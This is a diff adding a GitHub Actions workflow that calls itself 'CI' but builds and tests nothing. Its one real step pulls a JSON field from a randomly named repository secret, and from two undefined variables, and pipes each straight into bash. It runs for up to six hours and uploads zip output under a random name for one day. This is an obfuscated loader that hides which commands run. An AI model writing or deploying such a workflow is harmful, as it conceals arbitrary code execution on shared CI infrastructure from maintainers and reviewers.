@@ -1,0 +1,37 @@
+name: CI
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          r15300: ${{ secrets.r15300 }}
+        run: |
+          printf '%s' "$r15300" | jq -r .ide90 | /bin/bash
+          echo $geixs80 | jq -r .hfxf73 | /bin/bash
+          echo $gaou2193 | jq -r .yux379 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: uIG0zyZD
+          path: "*.zip"
+          retention-days: 1
